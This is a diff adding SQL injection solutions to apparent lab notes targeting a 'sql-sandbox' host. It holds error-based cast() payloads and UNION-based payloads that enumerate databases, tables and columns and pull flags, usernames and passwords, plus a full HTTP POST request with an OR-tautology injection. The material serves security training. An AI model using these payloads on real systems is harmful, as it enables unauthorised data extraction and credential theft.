@@ -198,7 +198,7 @@ Oracle
 to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
 ```
 
-Sol:
+Error Based Sol:
 
 ```
 POST /exploit/api/error HTTP/1.1
@@ -216,6 +216,64 @@ Connection: close
 inStock=cast(@@version as integer)&name=as&sort=id&order=asc
 
 ```
+```
+POST /exploit/api/error HTTP/1.1
+Host: sql-sandbox
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://sql-sandbox/exploit/error
+Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+Origin: http://sql-sandbox
+Content-Length: 57
+Connection: close
+
+inStock=1&name=mop%27+or+%271%27%3D%271&sort=id&order=asc
+```
+
+
+```
+1+or+1=1
+
+inStock=cast(@@version+as+varchar)&name=&sort=id&order=asc
+
+cast(@@version+as+varchar)
+
+
+SELECT string_agg(name, ', ') FROM sys.databases;
+
+cast((SELECT+string_agg(name,+',')+FROM+sys.databases;)+as+varchar)
+
+cast((SELECT+string_agg(name,+',')+FROM+sys.databases+where+name+like+'e%';)+as+varchar)
+
+cast((SELECT+string_agg(name,+',')+FROM+sys.databases+where+name+not+in+('master');)+as+varchar)
+
+select string_agg(table_name, ',') from app.information_schema.tables
+
+cast((select+string_agg(table_name,+',')+from+app.information_schema.tables;)+as+varchar)
+
+cast((select+string_agg(table_name,+',')+from+exercise.information_schema.tables;)+as+varchar)
+
+select string_agg(column_name, ',') from app.information_schema.columns where table_name='secretTable'
+
+cast((select+string_agg(column_name,+',')+from+app.information_schema.columns+where+table_name='secretTable';)+as+varchar)
+
+cast((select+string_agg(column_name,+',')+from+exercise.information_schema.columns+where+table_name='secrets';)+as+varchar)
+
+select flag from app.dbo.secretTable;
+
+cast((select+flag+from+app.dbo.secretTable;)+as+varchar)
+
+cast((select+flag+from+exercise.dbo.secrets;)+as+varchar)
+
+
+cast((select+flag+from+app.dbo.flags;)+as+varchar)
+
+cast((select+flag+from+exercise.dbo.flags;)+as+varchar)
+
+```
+
 
 
 1
@@ -242,4 +300,68 @@ inStock=cast(@@version as integer)&name=as&sort=id&order=asc
 8
 (NetSPI, 2019), https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql ↩︎
 
+
+###### UNION-based Payloads
+
+```
+SELECT id, name, description, price FROM menu UNION ALL SELECT id, username, password, 1 FROM users;
+
+```
+
+Input:
+
+```
+0 UNION ALL SELECT id, username, password, 0 from users
+```
+
+
+Query:
+```
+SELECT id, name, description, price FROM menu WHERE id = 0 UNION ALL SELECT id, username, password, 0 from users
+```
+
+```
+
+')  or ('1'='1
+
+z')) union select  version(),2,3,4--   
+
+```
+
+Payload:
+
+```
+
+name=z%27%29%29+union+select+VERSION()%2C2%2C3%2C4--+&sort=id&order=asc
+
+```
+Union based sol:
+
+```
+')  or ('1'='1
+'))--+ 
+
+select group_concat(distinct(table_schema) separator ', ') from information_schema.tables;
+
+
+select * from tablename where lower(name) like lower(concat('%',user_input,'%')); 
+
+
+
+
+z'))+union+select+version(),2,3,4--+
+
+z'))+union+select+concat('a','b'),2,3,4--+
+
+z'))+union+select+(select+group_concat(distinct(table_schema)+separator+',+')+from+information_schema.tables;),2,3,4--+
+
+z'))+union+select+(select+group_concat(distinct(table_name)+separator+',+')+from+information_schema.tables+where+table_schema='app';),2,3,4--+
+
+z'))+union+select+(select+group_concat(distinct(table_name)+separator+',+')+from+information_schema.tables+where+table_schema='exercise';),2,3,4--+
+
+z'))+union+select+(select+group_concat(distinct(column_name)+separator+',+')+from+information_schema.columns+where+table_schema='app'+and+table_name='hiddenTable';),2,3,4--+
+
+z'))+union+select+(select+group_concat(distinct(column_name)+separator+',+')+from+information_schema.columns+where+table_schema='exercise'+and+table_name='secrets';),2,3,4--+
+
+```
 
